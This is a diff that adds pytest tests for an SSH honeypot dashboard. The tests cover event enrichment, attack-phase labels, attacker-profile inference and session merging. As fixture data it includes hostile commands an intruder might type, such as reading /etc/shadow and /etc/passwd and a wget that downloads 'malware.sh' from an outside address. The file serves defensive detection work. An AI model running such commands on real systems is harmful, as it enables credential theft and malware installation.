@@ -1,0 +1,91 @@
+import pytest
+
+from dashboard.server import (
+    bounded_int,
+    cancel_active_attack,
+    enrich_event,
+    enrich_session,
+    event_phase,
+    merge_attack_session,
+    primary_attack_session,
+    infer_attacker_profile,
+)
+
+
+def test_bounded_int_clamps_invalid_and_out_of_range_values() -> None:
+    assert bounded_int("bad", 1, 10) == 1
+    assert bounded_int(0, 1, 10) == 1
+    assert bounded_int(25, 1, 10) == 10
+
+
+def test_cancel_active_attack_requires_a_running_dashboard_scenario() -> None:
+    with pytest.raises(ValueError, match="No scenario is currently active"):
+        cancel_active_attack()
+
+
+def test_enrich_event_explains_captured_command() -> None:
+    event = enrich_event(
+        {"event_type": "cowrie.command.input", "command": "cat /etc/shadow"}
+    )
+    assert event["event_type"] == "cowrie.command.input"
+    assert "password hashes" in event["explanation"]
+
+
+def test_event_phase_marks_discovery_and_credentials() -> None:
+    assert event_phase("cowrie.session.connect") == "discovery"
+    assert event_phase("cowrie.login.failed") == "credentials"
+    assert event_phase("cowrie.login.success") == "credentials"
+    assert event_phase("cowrie.command.input", "cat /etc/shadow") == "bait"
+
+
+def test_enrich_session_treats_commands_as_successful_access() -> None:
+    session = enrich_session(
+        {
+            "session_id": "session-1",
+            "login_success": False,
+            "command_count": 2,
+            "commands": ["id", "cat /etc/passwd"],
+        }
+    )
+    assert session["attack_type"].startswith("Successful SSH intrusion")
+
+
+def test_profile_inference_matches_simulator_command_sets() -> None:
+    assert infer_attacker_profile(
+        {
+            "command_count": 5,
+            "commands": ["uname -a", "id", "cat /etc/passwd", "ls", "whoami"],
+        }
+    ) == "scriptkiddie"
+    assert infer_attacker_profile(
+        {
+            "command_count": 11,
+            "commands": [
+                "cat /etc/shadow",
+                "ps aux",
+                "netstat -tulnp",
+                "wget http://203.0.113.10/malware.sh -O /tmp/m.sh",
+            ],
+        }
+    ) == "opportunist"
+    assert infer_attacker_profile(
+        {"command_count": 2, "commands": ["crontab -l", "cat /var/log/auth.log"]}
+    ) == "targeted"
+
+
+def test_attack_session_selection_prefers_successful_shell_and_merges_attempts() -> None:
+    failed = [
+        {"session_id": "failed-1", "login_attempts": 1, "login_success": False, "usernames_tried": ["guest"], "@timestamp": "2026-01-01T00:00:01Z"},
+        {"session_id": "failed-2", "login_attempts": 1, "login_success": False, "usernames_tried": ["operator"], "@timestamp": "2026-01-01T00:00:02Z"},
+    ]
+    successful = {"session_id": "shell", "login_attempts": 1, "login_success": True, "command_count": 4, "usernames_tried": ["deploy"], "@timestamp": "2026-01-01T00:00:03Z"}
+    primary = primary_attack_session(failed + [successful])
+    assert primary == successful
+    merged = merge_attack_session(failed + [successful], primary)
+    assert merged["login_attempts"] == 3
+    assert merged["login_success"] is True
+    assert merged["usernames_tried"] == ["guest", "operator", "deploy"]
+
+    duplicate_shell = dict(successful, session_id="shell-reconnect", login_attempts=1, command_count=0)
+    merged_duplicate = merge_attack_session(failed + [successful, duplicate_shell], primary)
+    assert merged_duplicate["login_attempts"] == 3
